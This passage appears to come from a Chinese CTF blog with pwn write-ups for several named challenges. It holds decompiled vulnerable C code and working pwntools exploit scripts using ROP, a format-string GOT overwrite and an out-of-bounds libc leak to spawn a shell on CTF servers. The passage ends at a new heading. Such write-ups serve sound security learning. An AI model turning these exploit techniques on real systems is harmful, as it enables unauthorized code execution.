class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload2)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h2 id="11-14"><a href="#11-14" class="headerlink" title="11.14"></a>11.14</h2><h3 id="FSCTF-2023-rdi"><a href="#FSCTF-2023-rdi" class="headerlink" title="[FSCTF 2023]rdi"></a>[FSCTF 2023]rdi</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">128</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  info();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xA0</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">gift</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用sh也可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">    port = <span class="number">1111</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line"></span><br><span class="line">rsi_r15 = rop.find_gadget([<span class="string">&#x27;pop rsi&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x000000000601088</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span> + <span class="number">8</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>+ p64(rdi) + p64(<span class="built_in">next</span>(elf.search(<span class="string">&quot;sh&quot;</span>))) + p64(<span class="number">0x0000000004006FB</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment"># puts = get_addr()</span></span><br><span class="line"><span class="comment"># success(&quot;puts: &#123;:#x&#125;&quot;.format(puts))</span></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="SWPUCTF-2022-新生赛-FindanotherWay"><a href="#SWPUCTF-2022-新生赛-FindanotherWay" class="headerlink" title="[SWPUCTF 2022 新生赛]FindanotherWay"></a>[SWPUCTF 2022 新生赛]FindanotherWay</h3><p>很简单不知道为什么没人做</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">28134</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">offset = <span class="number">0xC</span> + <span class="number">8</span></span><br><span class="line">payload = cyclic(offset) + p64(<span class="number">0x401250</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="watevrCTF-2019-Voting-Machine-2"><a href="#watevrCTF-2019-Voting-Machine-2" class="headerlink" title="[watevrCTF 2019]Voting Machine 2"></a>[watevrCTF 2019]Voting Machine 2</h3><p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20241114203744-skqyln2.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">24551</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># rdi = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span></span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line"><span class="comment"># info(&quot;rdi addr : &#123;:#x&#125;&quot;.format(rdi))</span></span><br><span class="line">payload = <span class="number">2</span> * <span class="string">b&#x27;a&#x27;</span> + fmtstr_payload(<span class="number">8</span>,&#123;elf.got[<span class="string">&#x27;puts&#x27;</span>]:elf.sym[<span class="string">&#x27;super_secret_function&#x27;</span>]&#125;,numbwritten=<span class="number">2</span>)</span><br><span class="line">s(payload)</span><br><span class="line">pr()</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lag&#x27;</span>)</span><br><span class="line">flag = p.recv(<span class="number">44</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="HGAME-2023-week1-choose-the-seat"><a href="#HGAME-2023-week1-choose-the-seat" class="headerlink" title="[HGAME 2023 week1]choose_the_seat"></a>[HGAME 2023 week1]choose_the_seat</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here is the seat from 0 to 9, please choose one.&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;There is no such seat&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;seats[<span class="number">16</span> * v0], <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;seats[<span class="number">16</span> * v0]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your seat is %d\n&quot;</span>, v0);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数组越界</p>
<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20241114205002-1ginaao.png" alt="image">​</p>
<p>修改exit为_start循环</p>
<p>然后后一位为read</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">29296</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">sl(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;name&#x27;</span>,p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;one.\n&#x27;</span>,<span class="string">b&#x27;-7&#x27;</span>) </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name&#x27;</span>,<span class="string">b&#x27;\xc0&#x27;</span>) </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your name is &#x27;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;one.\n&#x27;</span>,<span class="string">b&#x27;-9&#x27;</span>) </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="11-15"><a href="#11-15" class="headerlink" title="11.15"></a>11.15</h2><h3 id="SWPUCTF-2023-秋季新生赛-Shellcode"><a href="#SWPUCTF-2023-秋季新生赛-Shellcode" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]Shellcode"></a>[SWPUCTF 2023 秋季新生赛]Shellcode</h3><p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20241115221258-hy4yvas.png" alt="image">​</p>
